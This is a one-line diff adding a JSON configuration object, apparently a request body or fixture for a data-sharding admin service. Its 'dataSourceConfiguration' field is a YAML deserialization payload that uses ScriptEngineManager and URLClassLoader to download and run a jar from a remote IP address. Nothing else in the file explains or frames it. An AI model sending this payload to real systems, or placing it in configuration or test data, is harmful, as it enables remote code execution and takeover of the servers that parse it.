@@ -1,0 +1,1 @@
+{"name":"test","ruleConfiguration":"encryptors:\n    <encryptor-name>:\n      type: MD5\n      props:","dataSourceConfiguration":"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://188.131.187.191:9999999/yaml-payload.jar\"]]]]"}
